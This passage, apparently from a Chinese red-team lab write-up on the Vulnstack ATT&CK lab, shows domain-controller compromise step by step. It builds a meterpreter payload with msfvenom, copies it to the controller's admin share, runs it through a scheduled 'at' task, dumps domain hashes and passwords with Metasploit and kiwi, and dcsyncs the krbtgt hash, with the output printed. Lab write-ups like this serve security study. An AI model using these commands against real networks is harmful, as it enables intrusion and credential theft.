![](https://img-blog.csdnimg.cn/7fb60b0d8916405cad01466a05f69d41.png)
#### 获取域控权限
首先生成一个32位木马
```bash
msfvenom -p windows/meterpreter/bind_tcp LPORT=8888 -f exe > exp.exe
```
![](https://img-blog.csdnimg.cn/b14b2f9aed064c22b8e1c8b468491ad6.png)
然后上传到我们的域控中
```
upload ~/exp.exe c:/
copy exp.exe \\WIN-ENS2VR5TR3N\c$\exp.exe
```
![](https://img-blog.csdnimg.cn/035f679f217b4bb7bc355d88116c1fcf.png)
![](https://img-blog.csdnimg.cn/6323ca82fa48463f8a78cd0f7c13dbd5.png)

最后写入定时任务
```bash
net time \\WIN-ENS2VR5TR3N
at \\WIN-ENS2VR5TR3N 10:35:00 c:/exp.exe
```
![](https://img-blog.csdnimg.cn/07297232b9844de7a9363668d89cdba7.png)

然后返回msf监听8888端口，成功获取shell
![](https://img-blog.csdnimg.cn/1f9a4581d2374590a1244b7774450d04.png)
使用`run post/windows/gather/smart_hashdump`抓取域内所有hash
使用kiwi的creds_all获取密码
![](https://img-blog.csdnimg.cn/0d4b2dc3886e4eae87d2ce5787408b11.png)
获取Administrator密码后就可以使用3389连接了
获取krbtgt的信息`dcsync_ntlm krbtgt`
![](https://img-blog.csdnimg.cn/6128863c8dd843309059b762b3310258.png)
>[+] Account   : krbtgt
[+] NTLM Hash : 7c4ed692473d4b4344c3ba01c5e6cb63
[+] LM Hash   : 4d81a5d6b591f0710e75884e5ef9cba2
[+] SID       : S-1-5-21-979886063-1111900045-1414766810-502
[+] RID       : 502


参考：
[ATT&CK实战系列—红队实战-4](https://blog.csdn.net/weixin_42918771/article/details/116207505)
[渗透-Vulnstack靶机学习4](https://www.c0bra.xyz/2020/02/22/%E6%B8%97%E9%80%8F-Vulnstack%E9%9D%B6%E6%9C%BA%E5%AD%A6%E4%B9%A04/)